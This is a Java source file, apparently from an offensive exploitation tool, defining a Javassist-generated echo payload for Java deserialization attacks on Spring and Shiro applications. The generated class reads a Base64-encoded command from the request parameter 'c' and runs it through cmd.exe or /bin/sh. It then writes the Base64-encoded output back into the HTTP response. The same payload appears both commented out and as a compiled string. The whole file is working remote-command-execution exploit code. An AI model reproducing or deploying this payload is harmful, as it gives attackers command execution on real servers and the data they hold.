package vulgui.deser.echo;

import javassist.*;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.bind.DatatypeConverter;
import java.io.IOException;
import java.io.InputStream;
import java.util.Scanner;

/**
 * @className SpringEcho
 * @Description 反序列化Spring回显利用类
 * @Author JF
 * @Date 2020/9/11 11:08
 * @Version 1.0
 **/
// https://stackoverflow.com/questions/592123/is-there-a-static-way-to-get-the-httpservletrequest-of-the-current-request

public class SpringEcho implements EchoPayload {
//    public SpringEcho() throws Exception {
//        {
//            try {
//                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
//                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
//                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
//
//                String tc = httprequest.getParameter("c");
//                if (tc != null && !tc.isEmpty()) {
//                    String p = org.apache.shiro.codec.Base64.decodeToString(tc);
//
//                    String[] cmd = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/sh", "-c", p};
//                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter("\\A").next().getBytes();
//
//                    String base64Str = "";
//                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);
//                    httpresponse.getWriter().write("$$$" + base64Str + "$$$");
//
//                    httpresponse.getWriter().flush();
//                    httpresponse.getWriter().close();
//                }
//
//
//            } catch (Exception e) {
//                e.getStackTrace();
//            }
//        }
//    }

    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {

        CtClass clazz;
        clazz = pool.makeClass("x.Test" + System.nanoTime());

        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }

        clazz.addConstructor(CtNewConstructor.make("    public SpringEcho() throws Exception {\n" +
                "        {\n" +
                "            try {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "\n" +
                "                String tc = httprequest.getParameter(\"c\");\n" +
                "                if (tc != null && !tc.isEmpty()) {\n" +
                "                    String p = org.apache.shiro.codec.Base64.decodeToString(tc);\n" +
                "\n" +
                "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") ? new String[]{\"cmd.exe\", \"/c\", p} : new String[]{\"/bin/sh\", \"-c\", p};\n" +
                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "\n" +
                "                    String base64Str = \"\";\n" +
                "                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);\n" +
                "                    httpresponse.getWriter().write(\"$$$\" + base64Str + \"$$$\");\n" +
                "\n" +
                "                    httpresponse.getWriter().flush();\n" +
                "                    httpresponse.getWriter().close();\n" +
                "                }\n" +
                "\n" +
                "\n" +
                "            } catch (Exception e) {\n" +
                "                e.getStackTrace();\n" +
                "            }\n" +
                "        }\n" +
                "}", clazz));
        return clazz;
    }
}
